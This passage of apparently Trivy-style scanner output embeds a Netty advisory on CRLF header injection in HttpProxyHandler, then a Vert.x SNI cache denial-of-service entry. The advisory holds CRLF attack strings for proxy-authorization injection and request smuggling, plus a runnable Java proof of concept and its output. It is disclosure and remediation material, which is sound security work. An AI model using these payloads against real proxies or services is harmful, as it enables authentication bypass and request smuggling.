                        │      │                   1. The GHSA-84h7-rjj3-6jx4 fix's header validation is
                        │      │                   bypassed
                        │      │                   2. User-provided `outboundHeaders` are added without any
                        │      │                   CRLF check
                        │      │                   3. The resulting CONNECT request contains unvalidated
                        │      │                   headers on the wire
                        │      │                   This is not a new vulnerability class — it is the **same
                        │      │                   CRLF injection** that GHSA-84h7-rjj3-6jx4 was supposed to
                        │      │                   fix, but `HttpProxyHandler` was missed during the
                        │      │                   remediation. The fix for GHSA-84h7-rjj3-6jx4 should be
                        │      │                   extended to cover this code path.
                        │      │                   ## 4. Exploitability Prerequisites
                        │      │                   This vulnerability is exploitable when:
                        │      │                   1. An application uses `HttpProxyHandler` with
                        │      │                   user-influenced `outboundHeaders`
                        │      │                   2. The application does not perform its own CRLF
                        │      │                   sanitization on header values
                        │      │                   **Common affected patterns**:
                        │      │                   - HTTP proxy clients that forward user-specified custom
                        │      │                   headers
                        │      │                   - Web scraping frameworks that allow users to set proxy
                        │      │                   - API gateways that pass user headers through a proxy
                        │      │                   tunnel
                        │      │                   ## 5. Attack Scenarios
                        │      │                   ### Scenario 1: Proxy Authentication Bypass
                        │      │                   HttpHeaders headers = new DefaultHttpHeaders(false);
                        │      │                   headers.set("X-Forwarded-For", userInput);  // userInput
                        │      │                   from attacker
                        │      │                   new HttpProxyHandler(proxyAddr, headers);
                        │      │                   **Attack input**: `userInput =
                        │      │                   "1.2.3.4\r\nProxy-Authorization: Basic YWRtaW46YWRtaW4="`
                        │      │                   **Wire format**:
                        │      │                   CONNECT target.com:443 HTTP/1.1
                        │      │                   host: target.com:443
                        │      │                   X-Forwarded-For: 1.2.3.4
                        │      │                   Proxy-Authorization: Basic YWRtaW46YWRtaW4=    <-- INJECTED
                        │      │                   The injected `Proxy-Authorization` header may override or
                        │      │                   supplement the original authentication, potentially granting
                        │      │                    access to a restricted proxy.
                        │      │                   ### Scenario 2: Request Smuggling via Proxy
                        │      │                   **Attack input**: `userInput = "value\r\nTransfer-Encoding:
                        │      │                   chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost:
                        │      │                   internal-service"`
                        │      │                   Injects a full smuggled request through the proxy tunnel
                        │      │                   establishment.
                        │      │                   ## 6. Proof of Concept
                        │      │                   ### Full Runnable PoC Source Code
                        │      │                   (HttpProxyHeaderInjectionPoC.java)
                        │      │                   import io.netty.buffer.ByteBuf;
                        │      │                   import io.netty.channel.embedded.EmbeddedChannel;
                        │      │                   import io.netty.handler.codec.http.*;
                        │      │                   import java.nio.charset.StandardCharsets;
                        │      │                   public class HttpProxyHeaderInjectionPoC {
                        │      │                       public static void main(String[] args) {
                        │      │                           System.out.println("=== Netty HttpProxyHandler
                        │      │                   Header Injection PoC ===\n");
                        │      │                           // Simulate HttpProxyHandler.newInitialMessage()
                        │      │                   with validation=false
                        │      │                           HttpHeadersFactory headersFactory =
                        │      │                               .withValidation(false);
                        │      │                           FullHttpRequest req = new DefaultFullHttpRequest(
                        │      │                               HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
                        │      │                               "target.com:443",
                        │      │                               io.netty.buffer.Unpooled.EMPTY_BUFFER,
                        │      │                   headersFactory, headersFactory);
                        │      │                           req.headers().set(HttpHeaderNames.HOST,
                        │      │                   "target.com:443");
                        │      │                           // Inject CRLF in header value
                        │      │                           String malicious = "1.2.3.4\r\nX-Forwarded-For:
                        │      │                   127.0.0.1\r\nX-Admin: true";
                        │      │                           req.headers().set("X-Forwarded-For", malicious);
                        │      │                           // Encode to wire format
                        │      │                           EmbeddedChannel ch = new EmbeddedChannel(new
                        │      │                   HttpRequestEncoder());
                        │      │                           ch.writeOutbound(req);
                        │      │                           ByteBuf out = ch.readOutbound();
                        │      │                           String encoded =
                        │      │                   out.toString(StandardCharsets.UTF_8);
                        │      │                           out.release();
                        │      │                           ch.finishAndReleaseAll();
                        │      │                           System.out.println("Wire format:");
                        │      │                           for (String line : encoded.split("\n", -1)) {
                        │      │                               System.out.println("  " + line.replace("\r",
                        │      │                   "\\r"));
                        │      │                           }
                        │      │                           System.out.println("Injected X-Admin: " +
                        │      │                   encoded.contains("X-Admin: true"));
                        │      │                           System.out.println("VULNERABLE: " +
                        │      │                               (encoded.contains("X-Admin: true") ? "YES" :
                        │      │                   "NO"));
                        │      │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
                        │      │                   === Netty HttpProxyHandler Header Injection PoC ===
                        │      │                   [TEST 1] outboundHeaders with CRLF (validation disabled)
                        │      │                   ----------------------------------------------------------
                        │      │                     Injected header value: "1.2.3.4\r\nX-Forwarded-For:
                        │      │                   127.0.0.1\r\nX-Admin: true"
                        │      │                     Header accepted: YES (validation disabled!)
                        │      │                     Wire format:
                        │      │                       CONNECT target.com:443 HTTP/1.1\r
                        │      │                       host: target.com:443\r
                        │      │                       X-Forwarded-For: 1.2.3.4\r
                        │      │                       X-Forwarded-For: 127.0.0.1\r          <-- INJECTED
                        │      │                       X-Admin: true\r                        <-- INJECTED
                        │      │                       \r
                        │      │                     Injected X-Admin header in wire: true
                        │      │                     VULNERABLE: YES
                        │      │                   [TEST 2] validation=true vs validation=false comparison
                        │      │                   --------------------------------------------------------
                        │      │                     With validation=true:
                        │      │                       SAFE: Rejected - IllegalArgumentException
                        │      │                     With validation=false:
                        │      │                       VULNERABLE: Accepted CRLF in header value!
                        │      │                       Stored value contains CRLF: true
                        │      │                   ## 7. Remediation Recommendations
                        │      │                   ### Option 1: Remove withValidation(false)
                        │      │                   // Change HttpProxyHandler.java line 176 from:
                        │      │                   HttpHeadersFactory headersFactory =
                        │      │                   DefaultHttpHeadersFactory.headersFactory().withValidation(fa
                        │      │                   lse);
                        │      │                   // To:
                        │      │                   DefaultHttpHeadersFactory.headersFactory();
                        │      │                   ### Option 2: Validate outboundHeaders Before Adding
                        │      │                   if (outboundHeaders != null) {
                        │      │                       for (Map.Entry<String, String> entry : outboundHeaders)
                        │      │                   {
                        │      │                           HttpUtil.validateHeaderValue(entry.getValue());
                        │      │                       req.headers().add(outboundHeaders);
                        │      │                   ## 8. Resources
                        │      │                   - [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection
                        │      │                   (**incomplete fix — this
                        │      │                   report**)](https://github.com/netty/netty/security/advisorie
                        │      │                   s/GHSA-84h7-rjj3-6jx4)
                        │      │                   - [CWE-113: Improper Neutralization of CRLF Sequences in
                        │      │                   HTTP
                        │      │                   Headers](https://cwe.mitre.org/data/definitions/113.html) 
                        │      ├ Severity        : LOW 
                        │      ├ VendorSeverity   ─ ghsa: 1 
                        │      ╰ References       ╭ [0]: https://github.com/advisories/GHSA-84h7-rjj3-6jx4 
                        │                         ├ [1]: https://github.com/netty/netty 
                        │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-45q3-82m4-75jr 
                        ╰ [10] ╭ VulnerabilityID : CVE-2026-6860 
                               ├ VendorIDs        ─ [0]: GHSA-3g76-f9xq-8vp6 
                               ├ PkgName         : io.vertx:vertx-core 
                               ├ PkgPath         : openaf/Kube/vertx-core-4.5.24.jar 
                               ├ PkgIdentifier    ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
                               │                  ╰ UID : afaef31c626f9650 
                               ├ InstalledVersion: 4.5.24 
                               ├ Status          : affected 
                               ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                               │                  │         94edd8ebe468fc57d07e 
                               │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                               │                            e0961a5292bd158a4dcf 
                               ├ SeveritySource  : ghsa 
                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-6860 
                               ├ DataSource       ╭ ID  : ghsa 
                               │                  ├ Name: GitHub Security Advisory Maven 
                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                               │                          cosystem%3Amaven 
                               ├ Fingerprint     : sha256:402e825f71c710b46b624b95e957653c7b813e603dcb729c60c4e
                               │                   63420fb1f4d 
                               ├ Title           : Vert.x has a DoS via unbounded server-side SNI SslContext
                               │                   cache growth 
                               ├ Description     : A TCP client can perform a TLS handshake and present the
                               │                   server name extension with a server name that is accepted by
                               │                    a server wildcard name, e.g. if the server is configured
                               │                   with a certificate accepting *.example.com, any
                               │                   XYZ.example.com where xyz is a valid name can be used. 
                               ├ Severity        : MEDIUM 
                               ├ CweIDs           ╭ [0]: CWE-770 
                               │                  ╰ [1]: CWE-295 
                               ├ VendorSeverity   ╭ ghsa: 2 
                               │                  ╰ nvd : 2 
                               ├ CVSS             ╭ ghsa ╭ V3Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
                               │                  │      │            A:L 
                               │                  │      ├ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                               │                  │      │            :N/VA:L/SC:N/SI:N/SA:L 
                               │                  │      ├ V3Score  : 5.3 
                               │                  │      ╰ V40Score : 6.9 
                               │                  ╰ nvd  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
                               │                         ╰ V3Score : 5.3 
                               ├ References       ╭ [0]: https://github.com/eclipse-vertx/vert.x 
                               │                  ├ [1]: https://github.com/eclipse-vertx/vert.x/pull/6102 
                               │                  ├ [2]: https://github.com/eclipse-vertx/vert.x/security/advis
                               │                  │      ories/GHSA-3g76-f9xq-8vp6 
                               │                  ├ [3]: https://gitlab.eclipse.org/security/vulnerability-repo
                               │                  │      rts/-/issues/381 
                               │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-6860 
                               ├ PublishedDate   : 2026-05-06T10:16:26.293Z 
                               ╰ LastModifiedDate: 2026-05-12T13:42:01.617Z 
```
